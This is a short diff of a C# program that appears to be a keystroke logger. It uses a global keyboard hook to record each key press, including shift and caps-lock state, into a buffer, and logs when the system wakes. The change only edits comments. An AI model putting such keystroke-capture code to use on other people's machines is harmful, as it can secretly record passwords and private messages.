@@ -45,6 +45,7 @@ public static class Program
             if (e.Mode != PowerModes.Resume) return;
             // this line avoids wrong detection of caps lock state after the system goes to sleep
             _capsLockActive = Keyboard.GetCapsLockState();
+            // need to write the time of when the system was resumed, as it's effectively the same as turning it on
             logFile.WriteStartTime();
         };
 
@@ -83,8 +84,6 @@ public static class Program
         if (wParam == KEYUP) stringToWrite = Keyboard.HandleKeyUp(kbStruct, ref _shiftActive);
 
         Buffer.Add(stringToWrite);
-
-        // StringBuffer.WriteToFile(stringToWrite, Writer);
 
         return PInvoke.CallNextHookEx(_kbHook, code, wParam, lParam);
     }
